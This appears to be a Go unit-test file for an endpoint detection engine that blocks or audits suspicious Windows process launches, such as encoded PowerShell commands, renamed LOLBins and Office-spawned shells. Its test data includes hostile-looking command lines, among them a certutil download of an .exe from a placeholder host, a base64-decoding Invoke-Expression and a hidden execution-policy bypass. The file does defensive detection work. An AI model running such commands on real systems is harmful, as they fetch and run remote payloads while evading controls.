// STATUS: DIAMANT VGT SUPREME
package mhx

import (
	"encoding/base64"
	"testing"
	"unicode/utf16"
)

func encodedUTF16LE(value string) string {
	units := utf16.Encode([]rune(value))
	raw := make([]byte, len(units)*2)
	for index, unit := range units {
		raw[index*2] = byte(unit)
		raw[index*2+1] = byte(unit >> 8)
	}
	return base64.StdEncoding.EncodeToString(raw)
}

func TestSignedParentCannotCreateEncodedCommandAllowBypass(t *testing.T) {
	payload := `[System.Management.Automation.Language.Parser]::ParseInput($args[0],[ref]$tokens,[ref]$errors)`
	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand " + encodedUTF16LE(payload), ParentImage: "trusted-tool.exe", ParentSigState: "Valid", ParentSigner: "CN=Trusted Tool Vendor"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.Classification != "UNRESOLVED ENCODED COMMAND" || !result.ResponseAuthority {
		t.Fatalf("signed parent created an encoded-command bypass: %+v", result)
	}
}

func TestMaliciousPayloadOverridesSignedParent(t *testing.T) {
	payload := `Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))`
	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -enc " + encodedUTF16LE(payload), ParentImage: "trusted-tool.exe", ParentSigState: "Valid", ParentSigner: "CN=Trusted Tool Vendor"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.Classification != "SUSPICIOUS" {
		t.Fatalf("malicious content was not blocked: %+v", result)
	}
}

func TestMalformedBase64FailsClosed(t *testing.T) {
	result := (Evaluator{}).Analyze(ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand !!!"})
	if result.Disposition != DispositionBlock || result.Classification != "MALFORMED ENCODED COMMAND" {
		t.Fatalf("malformed payload failed open: %+v", result)
	}
}

func TestCertutilHashOperationRemainsAuditOnly(t *testing.T) {
	event := ProcessEvent{Image: "certutil.exe", ImagePath: `C:\Windows\System32\certutil.exe`, CommandLine: `certutil.exe -hashfile C:\safe.bin SHA256`, SignerStatus: "Valid"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionAudit {
		t.Fatalf("benign hash operation was blocked: %+v", result)
	}
}

func TestCertutilRemoteFetchIsBlocked(t *testing.T) {
	event := ProcessEvent{Image: "certutil.exe", ImagePath: `C:\Windows\System32\certutil.exe`, CommandLine: `certutil.exe -urlcache -split -f https://example.invalid/a.exe`, SignerStatus: "Valid"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.EffectiveSeverity != SeverityHigh {
		t.Fatalf("remote-fetch behavior escaped: %+v", result)
	}
}

func TestOfficeToPowerShellLineageIsBlocked(t *testing.T) {
	event := ProcessEvent{Image: "powershell.exe", ImagePath: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CommandLine: `powershell.exe -NoProfile -Command Get-Date`, SignerStatus: "Valid", Ancestry: []ProcessIdentity{{Image: "WINWORD.EXE"}}}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock {
		t.Fatalf("risky lineage escaped: %+v", result)
	}
}

func TestMasqueradedPowerShellIsBlocked(t *testing.T) {
	event := ProcessEvent{Image: "powershell.exe", ImagePath: `C:\Users\User\AppData\Local\Temp\powershell.exe`, CommandLine: `powershell.exe`, SignerStatus: "NotSigned"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock {
		t.Fatalf("masqueraded shell escaped: %+v", result)
	}
}

func TestSingleBehaviorSignalDoesNotGrantResponseAuthority(t *testing.T) {
	event := ProcessEvent{
		Image:        "certutil.exe",
		ImagePath:    `C:\Windows\System32\certutil.exe`,
		CommandLine:  `certutil.exe -urlcache -split -f https://example.invalid/a.exe`,
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock {
		t.Fatalf("expected block classification, got %s", result.Disposition)
	}
	if result.ResponseAuthority {
		t.Fatal("single behavioral signal must not grant host response authority")
	}
}

func TestIndependentSignalsGrantResponseAuthority(t *testing.T) {
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden`,
		SignerStatus: "Valid",
		Ancestry:     []ProcessIdentity{{Image: "WINWORD.EXE"}},
	}
	result := (Evaluator{}).Analyze(event)
	if !result.ResponseAuthority {
		t.Fatalf("expected independent evasion signals to grant response authority: %#v", result.Signals)
	}
}

func TestExecutionPolicyBypassAloneIsReviewOnly(t *testing.T) {
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Date`,
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionAudit || result.Classification != "REVIEW ONLY" {
		t.Fatalf("weak single signal was over-escalated: %+v", result)
	}
	if result.EffectiveSeverity != SeverityMedium {
		t.Fatalf("review-only signal severity = %s", result.EffectiveSeverity)
	}
}

func TestTransientSystemSignatureReadIsNotBlocked(t *testing.T) {
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  `powershell.exe -NoProfile -Command Get-Date`,
		SignerStatus: "NotSigned",
		ParentPID:    0,
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionAudit {
		t.Fatalf("system binary signature race was treated as a block: %+v", result)
	}
}

func TestUnresolvedEncodedCommandGrantsResponseAuthority(t *testing.T) {
	payload := "Get-Date"
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  "powershell.exe -EncodedCommand " + encodedUTF16LE(payload),
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.Classification != "UNRESOLVED ENCODED COMMAND" {
		t.Fatalf("encoded command lost its block classification: %+v", result)
	}
	if !result.ResponseAuthority {
		t.Fatalf("encoded-command block must authorize host response: %#v", result.Signals)
	}
}

func TestMalformedEncodedCommandGrantsResponseAuthority(t *testing.T) {
	for _, commandLine := range []string{
		"powershell.exe -EncodedCommand !!!",
		"powershell.exe -EncodedCommand:!!!",
		"powershell.exe -e=not-base64",
	} {
		result := (Evaluator{}).Analyze(ProcessEvent{Image: "powershell.exe", CommandLine: commandLine})
		if result.Disposition != DispositionBlock || result.Classification != "MALFORMED ENCODED COMMAND" {
			t.Fatalf("malformed encoded command %q did not fail closed: %+v", commandLine, result)
		}
		if !result.ResponseAuthority {
			t.Fatalf("malformed encoded command %q must authorize host response: %#v", commandLine, result.Signals)
		}
	}
}

func TestInlineEncodedCommandGrantsResponseAuthority(t *testing.T) {
	payload := encodedUTF16LE("Get-Date")
	for _, commandLine := range []string{
		"powershell.exe -e:" + payload,
		"powershell.exe -e=" + payload,
		"powershell.exe -en=" + payload,
		"powershell.exe /ec:" + payload,
		"powershell.exe -EncodedCommand:" + payload,
		"powershell.exe -EncodedCommand=" + payload,
	} {
		result := (Evaluator{}).Analyze(ProcessEvent{Image: "powershell.exe", CommandLine: commandLine})
		if result.Disposition != DispositionBlock || result.Classification != "UNRESOLVED ENCODED COMMAND" {
			t.Fatalf("inline encoded command %q was not classified: %+v", commandLine, result)
		}
		if !result.ResponseAuthority {
			t.Fatalf("inline encoded command %q must authorize host response: %#v", commandLine, result.Signals)
		}
		if result.DecodedBytes == 0 || result.DecodedEncoding != "UTF-16LE" {
			t.Fatalf("inline encoded command %q was not decoded: %+v", commandLine, result)
		}
	}
}

func TestEncodedCommandWithoutContentSignalsGrantsResponseAuthority(t *testing.T) {
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  "powershell.exe -NoLogo -NoProfile -EncodedCommand " + encodedUTF16LE("Write-Output 'hello'"),
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || len(result.Signals) == 0 || !result.ResponseAuthority {
		t.Fatalf("benign-looking encoded payload must still authorize response: %+v", result)
	}
}

func TestRenamedLolbinProvenanceIsBlockedAndCritical(t *testing.T) {
	event := ProcessEvent{
		Image:             "updater.exe",
		ImagePath:         `C:\ProgramData\VendorUpdate\updater.exe`,
		CommandLine:       `updater.exe -NoProfile -Command Get-Date`,
		SignerStatus:      "Valid",
		OriginalImageName: "PowerShell.EXE",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock {
		t.Fatalf("renamed LOLBin was not blocked: %+v", result)
	}
	if !result.ResponseAuthority {
		t.Fatalf("renamed LOLBin must authorize host response: %#v", result.Signals)
	}
	if result.EffectiveSeverity != SeverityCritical {
		t.Fatalf("renamed LOLBin severity = %s", result.EffectiveSeverity)
	}
	if !containsSignal(result.Signals, "provenance.renamed-lolbin") {
		t.Fatalf("renamed LOLBin signal missing: %#v", result.Signals)
	}
}

func TestRenamedNonLolbinOriginalNameIsNotFlagged(t *testing.T) {
	event := ProcessEvent{
		Image:             "updater.exe",
		ImagePath:         `C:\ProgramData\VendorUpdate\updater.exe`,
		CommandLine:       `updater.exe -silent`,
		SignerStatus:      "Valid",
		OriginalImageName: "Notepad.EXE",
	}
	result := (Evaluator{}).Analyze(event)
	if containsSignal(result.Signals, "provenance.renamed-lolbin") {
		t.Fatalf("non-LOLBin original name produced a rename signal: %#v", result.Signals)
	}
	if result.Disposition != DispositionAudit {
		t.Fatalf("benign third-party updater was escalated: %+v", result)
	}
}

func TestUnrenamedLolbinDoesNotEmitRenamedSignal(t *testing.T) {
	event := ProcessEvent{
		Image:             "powershell.exe",
		ImagePath:         `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:       `powershell.exe -NoProfile -Command Get-Date`,
		SignerStatus:      "Valid",
		OriginalImageName: "PowerShell.EXE",
	}
	result := (Evaluator{}).Analyze(event)
	if containsSignal(result.Signals, "provenance.renamed-lolbin") {
		t.Fatalf("unrenamed LOLBin produced a rename signal: %#v", result.Signals)
	}
	if result.Disposition != DispositionAudit {
		t.Fatalf("benign system PowerShell was escalated: %+v", result)
	}
}

func containsSignal(signals []string, wanted string) bool {
	for _, signal := range signals {
		if signal == wanted {
			return true
		}
	}
	return false
}

func TestEncodedCommandParserIsPowerShellOnly(t *testing.T) {
	evaluator := Evaluator{}

	goEvent := ProcessEvent{
		PID: 100, Image: "go.exe", ImagePath: `C:\Program Files\Go\bin\go.exe`,
		CommandLine: `go.exe list -e -json ./...`,
	}
	result := evaluator.Analyze(goEvent)
	for _, signal := range result.Signals {
		if signal == encodedCommandSignal || signal == "decode.failed" {
			t.Fatalf("go.exe -e must not be treated as a PowerShell encoded command: %+v", result)
		}
	}
	if result.Disposition == DispositionBlock {
		t.Fatalf("go.exe -e must not be blocked as encoded command: %+v", result)
	}

	nodeEvent := ProcessEvent{
		PID: 101, Image: "node.exe", ImagePath: `C:\Program Files\nodejs\node.exe`,
		CommandLine: `node.exe -e "console.log(1)"`,
	}
	result = evaluator.Analyze(nodeEvent)
	if result.Disposition == DispositionBlock {
		t.Fatalf("node.exe -e must not be blocked as encoded command: %+v", result)
	}

	powerShellEvent := ProcessEvent{
		PID: 102, Image: "powershell.exe", ImagePath: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine: `powershell.exe -NoProfile -EncodedCommand SQBFAFgA`,
	}
	result = evaluator.Analyze(powerShellEvent)
	if result.Disposition != DispositionBlock || result.Classification == "" {
		t.Fatalf("powershell -EncodedCommand must still block: %+v", result)
	}
}
